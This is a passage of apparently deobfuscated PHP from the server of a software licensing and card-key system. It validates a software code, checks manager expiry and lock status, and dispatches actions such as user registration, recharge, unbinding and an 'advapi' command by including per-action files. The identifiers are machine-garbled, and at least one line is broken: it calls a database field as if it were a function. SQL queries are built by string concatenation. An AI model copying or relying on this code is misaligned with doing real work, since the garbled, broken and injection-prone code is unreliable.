$_obfuscate_joeUio_LioqSh5WIiI2Pk4sˇ = $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[4];
$_obfuscate_io_UkouIkIyHj42UlI_GiZAˇ = explode( ",", $_obfuscate_joeUio_LioqSh5WIiI2Pk4sˇ );
$_obfuscate_jomPk5WKioeLipGGi4_PhpMˇ = time( );
if ( stripos( WEBLIC, "v9.hphu.com" ) )
{
    if ( stripos( WEBLIC, "vip.gutou.cc" ) !== FALSE )
    {
        if ( 1000200 < $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ )
        {
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
            {
                exit( "crypteno103" );
            }
            exit( "kssdata".QQ102.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) );
        }
    }
    if ( 1000100 < $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno103" );
        }
        exit( "kssdata".QQ102.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) );
    }
}
if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
{
    if ( !_obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0ˇ( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) || strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) != 7 )
    {
        if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0ˇ( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) !== TRUE )
        {
            exit( "crypteno330" );
        }
        exit( "crypteno103" );
    }
    if ( stripos( $_obfuscate_joeUio_LioqSh5WIiI2Pk4sˇ, "'" ) !== FALSE )
    {
        exit( "crypteno110" );
    }
}
$_obfuscate_h5CLkpKNipOHjIqSiIaUlYoˇ = _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0ˇ( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ );
if ( !_obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0ˇ( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) || strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) != 7 )
{
    if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0ˇ( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) !== TRUE )
    {
        exit( "kssdata".QQ330.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) );
    }
    exit( "kssdata".QQ102.strlen( $_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ ) );
}
if ( stripos( $_obfuscate_joeUio_LioqSh5WIiI2Pk4sˇ, "'" ) !== FALSE )
{
    exit( "kssdata".QQ103 );
}
$_obfuscate_ipGTiYaMjI2PjIiJjZSSkocˇ = dirname( __FILE__ ).DIRECTORY_SEPARATOR.$_obfuscate_kZOJlZCOlZKRioiGiIuPkokˇ.DIRECTORY_SEPARATOR;
$_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ = $_obfuscate_ipGTiYaMjI2PjIiJjZSSkocˇ.$_obfuscate_kZGNjJSKkpCQj4yOj5GNiIoˇ.".php";
$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ = new mysql_cls( );
$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ˇ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ );
$_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAˇ( "select * from kss_tb_soft where `softcode`=".$_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ );
if ( empty( $_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ ) )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno101" );
    }
    exit( "kssdata".QQ104 );
}
_obfuscate_i4yHiJWOjZKUkY_QkouIi5Mˇ( $_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ['mac_blacklist'], long2ip( $_obfuscate_kYmJjZOIiZKJioqMkoaGiYkˇ ), $_obfuscate_joeUio_LioqSh5WIiI2Pk4sˇ );
if ( $_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ['softstatus'] == 1 && $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIoˇ != "unline" )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno107" );
    }
    exit( "kssdata".QQ105 );
}
$_obfuscate_jpOTkJCPjI_TipSPjoeTjYsˇ = $_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ['pid']."_".$_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ['id'];
$_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44ˇ = $_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ['pid']( "select * from kss_tb_manager where `pid`=".$_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ['pid']." and `level`>7" );
if ( empty( $_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44ˇ ) )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno104" );
    }
    exit( "kssdata".QQ106 );
}
if ( $_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44ˇ['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIgˇ( ) && $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIoˇ != "unline" )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno105" );
    }
    exit( "kssdata".QQ107.$_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44ˇ['endtime'] );
}
if ( $_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44ˇ['islock'] == 1 && $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIoˇ != "unline" )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno106" );
    }
    exit( "kssdata".QQ108 );
}
_obfuscate_ho_Ki4_TiZCUk4yOkJCPh5Mˇ( );
switch ( $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIoˇ )
{
    case "unline" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[6], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[7], "linecode" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[8], "isrun" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[9] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    case "basechk" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[12], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[11], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[10], "chked" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[9], "linecode" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[8], "ischangesvr" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[7], "softver" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[6], "isrun" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5], "bdinfo" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[13], "valhost" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[14] );
        $_obfuscate_ioiLiYmJlYySlIeQkpSQkpEˇ = substr( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['valhost'], 0, 2 );
        $_obfuscate_hpCQiI_Ui42MkZSNko2Ni4Yˇ = $_obfuscate_ioiLiYmJlYySlIeQkpSQkpEˇ % 3;
        if ( $_obfuscate_hpCQiI_Ui42MkZSNko2Ni4Yˇ == 2 )
        {
            exit( "crypteno161" );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    case "advapi" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "czkey" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5], "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[7], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[6], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[8], "linecode" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[9], "ischangesvr" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[10], "cmd" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[11] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    case "reguser" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[6], "password2" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[7], "bdinfo" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[8], "puser" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[9], "czkey" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[10] );
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['username'] ) < 3 || 32 < strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['username'] ) )
        {
            exit( "kssdata".QQ109 );
        }
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['password'] ) < 5 )
        {
            exit( "kssdata".QQ110 );
        }
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['password2'] ) < 5 )
        {
            exit( "kssdata".QQ111 );
        }
        if ( 100 < strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['bdinfo'] ) )
        {
            exit( "kssdata".QQ112 );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    case "czuser" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5], "czkey" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[6] );
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['username'] ) < 3 )
        {
            exit( "kssdata".QQ113 );
        }
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['czkey'] ) < 32 )
        {
            exit( "kssdata".QQ114 );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    case "edituser" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[6], "password2" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[7], "bdinfo" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[8] );
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ['username'] ) < 3 )
        {
            exit( "kssdata".QQ113 );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    case "unbind" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[6], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[7], "isrun" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[8] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    case "view_uk" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Yˇ = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[5] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZEˇ );
        exit( );
    default :
        ob_clean( );
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno119" );
        }
        exit( "kssdata".QQ115 );
}
?>
